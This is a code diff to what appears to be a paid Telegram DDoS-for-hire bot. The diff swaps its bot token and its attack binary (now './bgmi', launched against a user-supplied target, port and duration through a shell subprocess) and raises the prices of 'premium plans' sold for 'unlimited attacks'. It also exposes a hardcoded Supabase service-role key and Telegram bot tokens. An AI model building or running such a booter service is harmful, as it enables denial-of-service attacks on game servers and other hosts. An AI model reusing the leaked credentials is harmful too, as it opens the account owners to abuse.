@@ -26,7 +26,7 @@ url = "https://ldmyijysjjaimrbpqmek.supabase.co"
 key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkbXlpanlzamphaW1yYnBxbWVrIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMjkwNjE5MSwiZXhwIjoyMDQ4NDgyMTkxfQ.mCpuIq0yPRskbuyxjXk57sB99dDqhxZ2YRJxtwaRk3U"
 supabase: Client = create_client(url, key)
 
-bot = telebot.TeleBot('7858493439:AAEDGY4WNmZkDHMFwwUbarXWmO3GXc8rB2s')
+bot = telebot.TeleBot('7608952192:AAHuAhO4ajjeDqGRTNTj1NpZR0MgnC4KkdY')
 IST = pytz.timezone('Asia/Kolkata')
 
 # Database connection
@@ -483,7 +483,7 @@ def start_attack_reply(message, target, port, time):
     
     try:
         # Execute attack
-        subprocess.run(f"./kaluaa {target} {port} {time}", shell=True)
+        subprocess.run(f"./bgmi {target} {port} {time}", shell=True)
         
         # Calculate attack duration
         end_time = datetime.now(IST)
@@ -836,10 +836,10 @@ def welcome_plan(message):
 
 👑 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗣𝗟𝗔𝗡𝗦:
 ━━━━━━━━━━━━━━━
-⚡️ 1 𝗗𝗔𝗬 - 99₹
-⚡️ 7 𝗗𝗔𝗬𝗦 - 299₹
-⚡️ 30 𝗗𝗔𝗬𝗦 - 499₹
-⚡️ 1 𝗦𝗘𝗔𝗦𝗢𝗡 - 749₹
+⚡️ 1 𝗗𝗔𝗬 - 100₹
+⚡️ 7 𝗗𝗔𝗬𝗦 - 350₹
+⚡️ 30 𝗗𝗔𝗬𝗦 - 600₹
+⚡️ 1 𝗦𝗘𝗔𝗦𝗢𝗡 - 1000₹
 
 💫 𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦:
 • 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝗔𝘁𝘁𝗮𝗰𝗸𝘀
